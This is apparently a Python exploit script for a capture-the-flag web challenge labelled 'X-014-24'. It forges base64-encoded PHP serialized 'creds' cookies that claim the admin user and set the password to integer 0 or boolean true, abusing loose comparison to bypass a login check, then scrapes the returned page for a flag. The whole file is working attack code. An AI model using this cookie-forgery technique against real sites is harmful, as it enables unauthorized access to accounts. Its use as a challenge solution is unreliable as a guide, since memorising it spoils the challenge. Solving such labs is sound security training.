#!/usr/bin/env python3
"""
X-014-24 exploit

Usage:
  python3 exp.py                 # uses default http://ip32778/index.php
  python3 exp.py <host> <port>   # e.g., python3 exp.py ip 32778
  python3 exp.py <full_url>      # e.g., python3 exp.py http://ip32778/index.php

Prints the extracted flag if found.
"""

import sys
import re
import base64
from urllib import request, error, parse


def build_cookie_variant_i0() -> str:
    # a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}
    payload = 'a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}'
    return base64.b64encode(payload.encode()).decode()


def build_cookie_variant_b1() -> str:
    # a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}
    payload = 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}'
    return base64.b64encode(payload.encode()).decode()


def parse_flag(html: str) -> str | None:
    # Prefer FLAG{...}
    m = re.search(r"(FLAG\{[^}]+\})", html, re.IGNORECASE)
    if m:
        return m.group(1)
    # Fallback: look for the phrase used in the page
    m = re.search(r"here is the flag:\s*([^<\n\r]+)", html, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    return None


def fetch(url: str, cookie_value: str, timeout: float = 8.0) -> str:
    req = request.Request(url)
    req.add_header("Cookie", f"creds={cookie_value}")
    with request.urlopen(req, timeout=timeout) as resp:
        data = resp.read()
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return data.decode("latin-1", errors="ignore")


def build_url_from_args(args: list[str]) -> str:
    if len(args) == 0:
        return "http://ip32778/index.php"
    if len(args) == 1 and (args[0].startswith("http://") or args[0].startswith("https://")):
        return args[0]
    if len(args) == 1:
        host = args[0]
        port = 80
        return f"http://{host}:{port}/index.php"
    # len >= 2
    host = args[0]
    port = args[1]
    # allow arg2 be int or string
    return f"http://{host}:{port}/index.php"


def main() -> int:
    url = build_url_from_args(sys.argv[1:])
    cookies = [build_cookie_variant_i0(), build_cookie_variant_b1()]

    last_err = None
    for ck in cookies:
        try:
            html = fetch(url, ck)
            flag = parse_flag(html)
            if flag:
                print(flag)
                return 0
        except error.HTTPError as e:  # server returned error code
            last_err = f"HTTP {e.code}"
        except Exception as e:
            last_err = str(e)

    if last_err:
        print(f"[-] Failed to retrieve flag from {url}: {last_err}")
    else:
        print(f"[-] Flag not found at {url}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
